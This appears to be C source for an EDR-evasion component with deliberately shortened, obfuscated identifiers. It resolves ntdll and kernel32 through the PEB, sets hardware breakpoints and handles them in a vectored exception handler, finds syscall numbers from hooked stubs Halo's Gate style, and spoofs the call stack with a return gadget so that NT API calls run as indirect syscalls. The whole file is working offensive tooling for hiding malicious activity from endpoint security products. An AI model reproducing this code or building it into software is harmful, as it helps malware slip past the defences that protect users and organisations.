#include "syscall.h"

#pragma region GlobalVariables

PVOID rhwhpqe;
HANDLE zjmdf;
HANDLE gNtdql;
UINT64 nqFncAddr;
UINT64 k32FncAddr;
UINT64 rgGdtAddr;
UINT64 stkArgs[ARG_LEN];
UINT64 clRgGdtAddr;
UINT64 clRgGdtAddrRt;
char clRgGdtVal;
UINT64 rgBkp;

#pragma endregion

#pragma region BinaryPatternMatching

BOOL CmprMsk(const BYTE* dt, const BYTE* msk, const char* szMsk)
{
    for (; *szMsk; ++szMsk, ++dt, ++msk)
        if (*szMsk == 'x' && *dt != *msk)
            return FALSE;
    return TRUE;
}

DWORD_PTR FndPtrn(DWORD_PTR dAddr, DWORD dLen, PBYTE msk, PCHAR szMsk)
{
    for (DWORD i = 0; i < dLen; i++)
        if (CmprMsk((PBYTE)(dAddr + i), msk, szMsk))
            return (DWORD_PTR)(dAddr + i);

    return 0;
}

DWORD_PTR FndInMdl(LPCSTR mdlName, PBYTE msk, PCHAR szMsk)
{
    DWORD_PTR dAddr = 0;
    PIMAGE_DOS_HEADER imgBase = (PIMAGE_DOS_HEADER)GetModuleHandleA(mdlName);

    if (!imgBase)
        return 0;

    DWORD_PTR sctnOffset = (DWORD_PTR)imgBase + imgBase->e_lfanew + sizeof(IMAGE_NT_HEADERS);

    if (!sctnOffset)
        return 0;

    PIMAGE_SECTION_HEADER txtSctn = (PIMAGE_SECTION_HEADER)(sctnOffset);
    dAddr = FndPtrn((DWORD_PTR)imgBase + txtSctn->VirtualAddress, txtSctn->SizeOfRawData, msk, szMsk);
    return dAddr;
}

#pragma endregion

#pragma region PEBGetProcAddress

UINT64 GtMdlAddr(LPWSTR mdlName) {
    PPEB peb = (PPEB)__readgsqword(X64_PEB_OFF);
    LIST_ENTRY* MdlList = NULL;

    if (!mdlName)
        return 0;

    for (LIST_ENTRY* pListEntry = peb->LoaderData->InMemoryOrderModuleList.Flink;
        pListEntry != &peb->LoaderData->InMemoryOrderModuleList;
        pListEntry = pListEntry->Flink) {

        PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        if (wcsstr(pEntry->FullDllName.Buffer, mdlName)) {
            return (UINT64)pEntry->DllBase;
        }
    }
    return 0;
}

UINT64 GtSymbAddr(UINT64 mdlBase, const char* fncName) {
    UINT64 fncAddr = 0;
    PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)mdlBase;

    // Checking that the image is valid PE file.
    if (dosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
        return 0;
    }

    PIMAGE_NT_HEADERS ntHdrs = (PIMAGE_NT_HEADERS)(mdlBase + dosHdr->e_lfanew);

    if (ntHdrs->Signature != IMAGE_NT_SIGNATURE) {
        return fncAddr;
    }

    IMAGE_OPTIONAL_HEADER optHdr = ntHdrs->OptionalHeader;

    if (optHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0) {
        return fncAddr;
    }

    // Iterating the export directory.
    PIMAGE_EXPORT_DIRECTORY expDir = (PIMAGE_EXPORT_DIRECTORY)(mdlBase + optHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* addrs = (DWORD*)(mdlBase + expDir->AddressOfFunctions);
    WORD* ordnls = (WORD*)(mdlBase + expDir->AddressOfNameOrdinals);
    DWORD* nms = (DWORD*)(mdlBase + expDir->AddressOfNames);

    for (DWORD j = 0; j < expDir->NumberOfNames; j++) {
        if (_stricmp((char*)(mdlBase + nms[j]), fncName) == 0) {
            fncAddr = mdlBase + addrs[ordnls[j]];
            break;
        }
    }

    return fncAddr;
}

#pragma endregion

#pragma region HalosGate

// DWORD64 FndSysclNum(DWORD64 fncAddr) {
//     WORD sysclNum = 0;

//     for (WORD idx = 1; idx <= 500; idx++) {
//         // check neighboring syscall down
//         if (*((PBYTE)fncAddr + idx * DN) == 0x4c
//             && *((PBYTE)fncAddr + 1 + idx * DN) == 0x8b
//             && *((PBYTE)fncAddr + 2 + idx * DN) == 0xd1
//             && *((PBYTE)fncAddr + 3 + idx * DN) == 0xb8
//             && *((PBYTE)fncAddr + 6 + idx * DN) == 0x00
//             && *((PBYTE)fncAddr + 7 + idx * DN) == 0x00) {
//             BYTE high = *((PBYTE)fncAddr + 5 + idx * DN);
//             BYTE low = *((PBYTE)fncAddr + 4 + idx * DN);

//             sysclNum = (high << 8) | low - idx;
//             DPNT("[+] SSN: 0x%X\n", sysclNum);
//             break;
//         }

//         // check neighboring syscall up
//         if (*((PBYTE)fncAddr + idx * UP) == 0x4c
//             && *((PBYTE)fncAddr + 1 + idx * UP) == 0x8b
//             && *((PBYTE)fncAddr + 2 + idx * UP) == 0xd1
//             and*((PBYTE)fncAddr + 3 + idx * UP) == 0xb8
//             && *((PBYTE)fncAddr + 6 + idx * UP) == 0x00
//             && *((PBYTE)fncAddr + 7 + idx * UP) == 0x00) {
//             BYTE high = *((PBYTE)fncAddr + 5 + idx * UP);
//             BYTE low = *((PBYTE)fncAddr + 4 + idx * UP);

//             sysclNum = (high << 8) | low + idx;
//             DPNT("[+] SSN: 0x%X\n", sysclNum);
//             break;
//         }

//     }

//     if (sysclNum == 0)
//         DPNT("[-] SSN not found\n");

//     return sysclNum;
// }


DWORD64 FndSysclNum(DWORD64 fncAddr) {
    WORD syscallNumber = 0;
    BOOL found = FALSE;


    if (*((PBYTE)fncAddr) == 0x4c
        && *((PBYTE)fncAddr + 1) == 0x8b
        && *((PBYTE)fncAddr + 2) == 0xd1
        && *((PBYTE)fncAddr + 3) == 0xb8
        && *((PBYTE)fncAddr + 6) == 0x00
        && *((PBYTE)fncAddr + 7) == 0x00) {
        BYTE high = *((PBYTE)fncAddr + 5);
        BYTE low = *((PBYTE)fncAddr + 4);
        syscallNumber = (high << 8) | low;
        found = TRUE;
        DPNT("[+] Found SSN: 0x%X\n", syscallNumber);
        return syscallNumber;
    }

    // Enhanced check for jumps at the beginning, similar to Method 2
    if (*((PBYTE)fncAddr) == 0xe9 || 
        *((PBYTE)fncAddr + 3) == 0xe9 || 
        *((PBYTE)fncAddr + 8) == 0xe9 ||
        *((PBYTE)fncAddr + 10) == 0xe9 || 
        *((PBYTE)fncAddr + 12) == 0xe9) {

        // After finding a jump, start looking for the syscall pattern.
        for (WORD idx = 1; idx <= 500; idx++) {
            // Checking DN direction for the syscall pattern
            if (*((PBYTE)fncAddr + idx * DN) == 0x4c
                && *((PBYTE)fncAddr + 1 + idx * DN) == 0x8b
                && *((PBYTE)fncAddr + 2 + idx * DN) == 0xd1
                && *((PBYTE)fncAddr + 3 + idx * DN) == 0xb8
                && *((PBYTE)fncAddr + 6 + idx * DN) == 0x00
                && *((PBYTE)fncAddr + 7 + idx * DN) == 0x00) {
                BYTE high = *((PBYTE)fncAddr + 5 + idx * DN);
                BYTE low = *((PBYTE)fncAddr + 4 + idx * DN);
                syscallNumber = (high << 8) | low - idx;
                found = TRUE;
                DPNT("[+] Found SSN: 0x%X\n", syscallNumber);
                break;
            }
            // Checking UP direction for the syscall pattern
            if (*((PBYTE)fncAddr + idx * UP) == 0x4c
                && *((PBYTE)fncAddr + 1 + idx * UP) == 0x8b
                && *((PBYTE)fncAddr + 2 + idx * UP) == 0xd1
                && *((PBYTE)fncAddr + 3 + idx * UP) == 0xb8
                && *((PBYTE)fncAddr + 6 + idx * UP) == 0x00
                && *((PBYTE)fncAddr + 7 + idx * UP) == 0x00) {
                BYTE high = *((PBYTE)fncAddr + 5 + idx * UP);
                BYTE low = *((PBYTE)fncAddr + 4 + idx * UP);
                syscallNumber = (high << 8) | low + idx;
                found = TRUE;
                DPNT("[+] Found SSN: 0x%X\n", syscallNumber);
                break;
            }
        }
    }

    // for (WORD idx = 1; idx <= 500; idx++) {
    //     // check neighboring syscall down
    //     if (*((PBYTE)fncAddr + idx * DN) == 0x4c
    //         && *((PBYTE)fncAddr + 1 + idx * DN) == 0x8b
    //         && *((PBYTE)fncAddr + 2 + idx * DN) == 0xd1
    //         && *((PBYTE)fncAddr + 3 + idx * DN) == 0xb8
    //         && *((PBYTE)fncAddr + 6 + idx * DN) == 0x00
    //         && *((PBYTE)fncAddr + 7 + idx * DN) == 0x00) {
    //         BYTE high = *((PBYTE)fncAddr + 5 + idx * DN);
    //         BYTE low = *((PBYTE)fncAddr + 4 + idx * DN);

    //         syscallNumber = (high << 8) | low - idx;
    //         found = TRUE;
    //         DPNT("[+] Found SSN: 0x%X\n", syscallNumber);
    //         break;
    //     }

    //     // check neighboring syscall up
    //     if (*((PBYTE)fncAddr + idx * UP) == 0x4c
    //         && *((PBYTE)fncAddr + 1 + idx * UP) == 0x8b
    //         && *((PBYTE)fncAddr + 2 + idx * UP) == 0xd1
    //         && *((PBYTE)fncAddr + 3 + idx * UP) == 0xb8
    //         && *((PBYTE)fncAddr + 6 + idx * UP) == 0x00
    //         && *((PBYTE)fncAddr + 7 + idx * UP) == 0x00) {
    //         BYTE high = *((PBYTE)fncAddr + 5 + idx * UP);
    //         BYTE low = *((PBYTE)fncAddr + 4 + idx * UP);

    //         syscallNumber = (high << 8) | low + idx;
    //         DPNT("[+] Found SSN: 0x%X\n", syscallNumber);
    //         break;
    //     }

    // }

    if (syscallNumber == 0)
        DPNT("[-] Could not find SSN\n");

    return syscallNumber;
}

DWORD64 FndSysclRtnAddr(DWORD64 fncAddr) {
    DWORD64 sysclRtnAddr = 0;

    for (WORD idx = 1; idx <= 32; idx++) {
        if (*((PBYTE)fncAddr + idx) == 0x0f && *((PBYTE)fncAddr + idx + 1) == 0x05) {
            sysclRtnAddr = (DWORD64)((PBYTE)fncAddr + idx);
            DPNT("[+] \"syscall;ret;\" addr: 0x%I64X\n", sysclRtnAddr);
            break;
        }
    }

    if (sysclRtnAddr == 0)
        DPNT("[-] \"syscall;ret;\" addr not found\n");

    return sysclRtnAddr;
}

#pragma endregion

UINT64 PrprSyscl(char* fncName) {
    return nqFncAddr;
}

bool StMainBP() {
    // Dynamically find the GetThreadContext and SetThreadContext functions
    GtThrdCtxt_t pGtThrdCtxt = (GtThrdCtxt_t)GtSymbAddr(GtMdlAddr((LPWSTR)L"KERNEL32.DLL"), "GetThreadContext");
    StThrdCtxt_t pStThrdCtxt = (StThrdCtxt_t)GtSymbAddr(GtMdlAddr((LPWSTR)L"KERNEL32.DLL"), "SetThreadContext");

    DWORD old = 0;

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    // Get current thread context
    pGtThrdCtxt(zjmdf, &ctx);
    
    // Set hardware breakpoint on PrprSyscl function
    ctx.Dr0 = (UINT64)&PrprSyscl;
    ctx.Dr7 |= (1 << 0);
    ctx.Dr7 &= ~(1 << 16);
    ctx.Dr7 &= ~(1 << 17);
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    // Apply the modified context to the current thread
    if (!pStThrdCtxt(zjmdf, &ctx)) {
        DPNT("[-] Thread context set failed: 0x%X", GetLastError());
        return false;
    }

    DPNT("[+] Main HWBP set\n");
    return true;
}

LONG HWScExHndlr(EXCEPTION_POINTERS* ExInfo) {
    if (ExInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        if (ExInfo->ContextRecord->Rip == (DWORD64)&PrprSyscl) {
            DPNT("\n===============HWSCALLS DEBUG===============");
            DPNT("\n[+] PrprSyscl BP Hit (%#llx)!\n", ExInfo->ExceptionRecord->ExceptionAddress);
            
            // Find the address of the syscall function in ntdll we got as the first argument of the PrprSyscl function
            nqFncAddr = GtSymbAddr((UINT64)gNtdql, (const char*)(ExInfo->ContextRecord->Rcx));
            DPNT("[+] Found %s addr: 0x%I64X\n", (const char*)(ExInfo->ContextRecord->Rcx), nqFncAddr);
            
            // Move breakpoint to the NTAPI function;
            DPNT("[+] Moving BP to %#llx\n", nqFncAddr);
            ExInfo->ContextRecord->Dr0 = nqFncAddr;
        }
        else if (ExInfo->ContextRecord->Rip == (DWORD64)nqFncAddr) {
            DPNT("[+] NTAPI Func BP Hit (%#llx)!\n", (DWORD64)ExInfo->ExceptionRecord->ExceptionAddress);
            
            // Create a new stack to spoof the kernel32 function address
            // The stack size will be 0x70 which is compatible with the RET_GADGET we found.
            // sub rsp, 70
            ExInfo->ContextRecord->Rsp -= 0x70;
            // mov rsp, RG_GDT_ADDR
            *(PULONG64)(ExInfo->ContextRecord->Rsp) = rgGdtAddr;
            DPNT("[+] New stack frame with RG_GDT as return addr\n", rgGdtAddr);

            // Copy the stack arguments from the original stack
            for (size_t idx = 0; idx < ARG_LEN; idx++)
            {
                const size_t offset = idx * ARG_LEN + ARG_RSP_OFF;
                *(PULONG64)(ExInfo->ContextRecord->Rsp + offset) = *(PULONG64)(ExInfo->ContextRecord->Rsp + offset + 0x70);
            }
            DPNT("[+] Stack args copied to new stack\n");

            DWORD64 pFncAddr = ExInfo->ContextRecord->Rip;

            // char nonHookedSyscallBytes[] = { 0x4C,0x8B,0xD1,0xB8 };
            unsigned char nhSysclBytes[] = { 0x4C, 0x8B, 0xD1, 0xB8 };

            if (FndPtrn(pFncAddr, 4, (PBYTE)nhSysclBytes, (PCHAR)"xxxx")) {
                DPNT("[+] Func not hooked\n");
                DPNT("[+] Continuing normal exec\n");
            }
            else {
                DPNT("[+] Func HOOKED!\n");
                DPNT("[+] Finding SSN via Halos Gate\n");

                /// Replace
                WORD sysclNum = FndSysclNum(pFncAddr);

                if (sysclNum == 0) {
                    ExInfo->ContextRecord->Dr0 = clRgGdtAddrRt;
                    return EXCEPTION_CONTINUE_EXECUTION;
                }

                /// replace
                DWORD64 sysclRtnAddr = FndSysclRtnAddr(pFncAddr);

                if (sysclRtnAddr == 0) {
                    ExInfo->ContextRecord->Dr0 = clRgGdtAddrRt;
                    return EXCEPTION_CONTINUE_EXECUTION;
                }

                // mov r10, rcx
                DPNT("[+] RCX to R10 (mov r10, rcx)\n");
                ExInfo->ContextRecord->R10 = ExInfo->ContextRecord->Rcx;
                //mov eax, SSN
                DPNT("[+] SSN to RAX (mov rax, 0x%X)\n", sysclNum);
                ExInfo->ContextRecord->Rax = sysclNum;
                //Set RIP to syscall;ret; opcode addr
                DPNT("[+] Jump to \"syscall;ret;\" addr: 0x%I64X\n", sysclRtnAddr);
                ExInfo->ContextRecord->Rip = sysclRtnAddr;

            }

            // Move BP back to PrprSyscl to catch next invoke
            DPNT("[+] BP back to PrprSyscl for next invoke\n");
            ExInfo->ContextRecord->Dr0 = (UINT64)&PrprSyscl;

            DPNT("=============================================\n\n");

        }
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

bool FndRtGdt() {
    // Dynamically search for a suitable "ADD RSP,68;RET" gadget in both kernel32 and kernelbase
    rgGdtAddr = FndInMdl("KERNEL32.DLL", (PBYTE)"\x48\x83\xC4\x68\xC3", (PCHAR)"xxxxx");
    if (rgGdtAddr != 0) {
        DPNT("[+] Found RET_GADGET in kernel32.dll: %#llx\n", rgGdtAddr);
        return true;
    }
    else {
        rgGdtAddr = FndInMdl("kernelbase.dll", (PBYTE)"\x48\x83\xC4\x68\xC3", (PCHAR)"xxxxx");
        DPNT("[+] Found RET_GADGET in kernelbase.dll: %#llx\n", rgGdtAddr);
        if (rgGdtAddr != 0) {
            return true;
        }
    }
    return false;
}

bool OpnRICls() {
    zjmdf = GetCurrentThread();
    gNtdql = (HANDLE)GtMdlAddr((LPWSTR)L"ntdll.dll");

    if (!FndRtGdt()) {
        DPNT("[!] Proper \"ADD RSP,68;RET\" gadget not found. OpnRICls failed.");
        return false;
    }

    // Register exception handler
    rhwhpqe = AddVectoredExceptionHandler(1, &HWScExHndlr);

    if (!rhwhpqe) {
        DPNT("[!] VEH registration failed: 0x%X\n", GetLastError());
        return false;
    }

    return StMainBP();
}

bool ClsRICls() {
    return RemoveVectoredExceptionHandler(rhwhpqe) != 0;
}
